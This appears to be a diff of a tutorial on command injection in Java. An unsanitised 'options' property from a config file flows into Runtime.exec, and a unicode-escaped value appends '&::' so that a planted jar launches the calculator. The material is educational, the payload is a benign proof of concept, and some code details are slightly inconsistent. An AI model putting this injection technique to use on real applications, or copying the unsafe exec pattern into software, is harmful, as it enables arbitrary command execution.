@@ -23,7 +23,7 @@ try (FileInputStream stream = new FileInputStream("app.properties")) {
 }
 
 String options = properties.getProperty("options", "");
-String command = String.format("\"C:/Program Files/Java/jre1.8.0_111/bin/javaw\" -cp ".;./dependencies/*\" %s com.example.main.Example", new Object[] { options });
+String command = String.format("\"C:/Program Files/Java/jrexxx/bin/javaw\" -cp ".;./dependencies/*\" %s com.example.main.Example", new Object[] { options });
 
 Process process = runtime.exec(command);
 ```
@@ -49,23 +49,21 @@ public class Calc {
 }
 ```
 
-Compile the source code. The `-d .` makes the compiler create the defined directory structure.
+Compile the source code using the -d . option, which instructs the compiler to generate the specified directory structure.
 
 ```
 javac -d . Calc.java
 ```
 
-When packaging the `.jar` file, you need to instruct the jar routine on how to pack it. Here I use the option set `cvfeP`. This is to keep the package structure (option `P`), specify the entry point so that the manifest file contains meaningful information (option `e`). Option `f` lets you specify the file name, option `c` creates an archive and option `v` sets the output to verbose. The important things to note here are `P` and `e`.
-
-Next, follow the command with the name of the jar (test.jar) and the entry point.
-
-Lastly, use `-C . <packagename>/` to get the class files from the specified folder, preserving the folder structure.
+When creating a .jar file, you should use the `cvfeP` option set to guide the packaging process.
 
 ```
-jar cvfeP calc.jar .Calc -C . command/injection/
+jar cvfeP calc.jar command.injection.Calc -C . command/injection/
 ```
 
-Open the calc.jar file in a zip program. It should have the following structure:
+This ensures the preservation of the package structure (P), sets the entry point for meaningful manifest information (e), names the file (f), creates an archive (c), and enables verbose output (v). The key options to focus on are P for maintaining the package structure and e for specifying the entry point. Then, append the command with the jar's name (test.jar) and its entry point. Conclude by using -C . <packagename>/ to collect class files from the designated folder while maintaining the folder's structure.
+
+Open the `calc.jar` file in a zip program to ensure that it has the following directory structure:
 
 ```
 command/
@@ -83,22 +81,22 @@ Created-By: <JDK Version> (Oracle Corporation)
 Main-Class: command.injection.Calc
 ```
 
-If you edit your manifest by hand, be sure to keep the newline at the end otherwise java doesn't recognize it.
+When manually editing your manifest file, it's important to retain the newline at the end; otherwise, Java will not recognize the manifest correctly.
 
 Place `calc.jar` into the `/dependencies` directory of the target application.
 
-Add the following property to the `application.properties` file of the application:
+Add the following property to the configuration file (`application.properties`) of the application:
 
 ```
 options=command.injection.Calc\u0020\u0026\u003A\u003A\u0020
 ```
 
-Run the target application and observe that the calculator application will open instead of the intended source.
+Run the target application and observe that instead of the expected program, the calculator app will launch.
 
-Below is the value that had entered the `exec` function.
+Below is the value that was fed into the exec function.
 
 ```
-"C:/Program Files/Java/jre1.8.0_111/bin/javaw" -cp ".;./dependencies/*\" command.injection.Calc &:: com.example.main.Example
+"C:/Program Files/Java/jrexxx/bin/javaw" -cp ".;./dependencies/*\" command.injection.Calc &:: com.example.main.Example
 ```
 
 ## References
